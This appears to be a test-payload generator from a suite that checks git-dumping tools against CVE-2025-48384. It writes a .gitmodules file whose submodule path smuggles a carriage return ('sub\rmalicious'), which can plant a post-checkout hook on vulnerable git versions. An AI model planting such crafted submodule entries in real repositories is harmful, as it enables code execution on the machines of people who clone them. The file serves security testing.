"""E1: CVE-2025-48384 — submodule path containing carriage return.

A pillager that runs ``git clone --recursive`` against the recovered
repository on a vulnerable git version writes a post-checkout hook to
an attacker-controlled path. Pillagers that don't process submodules
or have a patched git version PASS this test.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402

GITMODULES = (
    b'[submodule "evil"]\n\tpath = sub\rmalicious\n\turl = https://example.invalid/sub.git\n'
)


def main() -> None:
    build_minimal_repo(
        HERE / 'payload',
        config=config_with(''),
        tree_entries=[
            (0o100644, '.gitmodules', GITMODULES),
        ],
    )
    print(f'Built E1 payload at {HERE / "payload"}')


if __name__ == '__main__':
    main()
